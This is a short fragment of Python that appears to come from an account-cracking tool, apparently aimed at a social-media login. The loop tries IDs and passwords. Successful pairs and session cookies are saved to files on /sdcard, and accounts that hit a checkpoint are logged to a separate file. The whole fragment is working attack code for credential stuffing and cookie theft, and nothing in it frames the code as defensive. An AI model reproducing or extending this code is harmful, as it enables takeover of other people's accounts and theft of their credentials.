                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r\033[0;31m[\033[1;92mGREAT-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}');cek_apk(session,coki)
                        open('/sdcard/GREAT-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/GREAT-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            elif 'checkpoint' in log_cookies:               
                open('/sdcard/GREAT-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(cid)
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

GREAT()  '))